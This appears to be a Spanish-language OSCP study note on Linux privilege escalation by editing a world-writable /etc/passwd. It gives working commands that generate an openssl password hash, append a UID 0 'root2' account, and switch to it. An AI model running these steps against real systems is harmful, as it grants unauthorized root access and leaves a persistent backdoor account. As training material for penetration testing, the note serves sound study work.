---
tipo: tecnica
fase: privesc
so: linux
tags: [oscp, tecnica, privesc, linux]
fecha: 2026-10-08
---

# Editar /etc/passwd para Privesc

> [!abstract] Qué es y cuándo usarla
> `/etc/passwd` normalmente solo es escribible por root, pero si por error de configuración es **world-writable**, cualquier user puede añadir una línea con UID/GID `0` y un hash de password propio para crear una cuenta "root" a medida.

## Requisitos previos
- Comprobar permisos: `ls -la /etc/passwd` (buscar `w` para `others`).
- `openssl` disponible para generar el hash de password.

## Pasos
```bash
ls -la /etc/passwd                            # confirmar si es world-writable
openssl passwd <password_elegida>               # genera un hash compatible con el formato crypt de /etc/passwd
echo "root2:<hash_generado>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2                                          # login con el password elegido
whoami                                              # confirmar uid=0(root)
```

> [!warning] Detección / problemas
> - `/etc/passwd` world-writable es poco común, pero rápido de comprobar — siempre merece una línea en la checklist de enumeración.
> - El formato del hash puede variar según el sistema (algoritmo DES/MD5/SHA según versión de OpenSSL); si falla el login, probar otro algoritmo.
> - Dejar una cuenta nueva en `/etc/passwd` es una modificación persistente — limpiarla al terminar en un entorno real.

## Visto en
- Módulo: [[18 - Linux Privilege Escalation]]
- Relacionado: [[SUID y Capabilities (Linux)]]
- Máquinas: [[]]
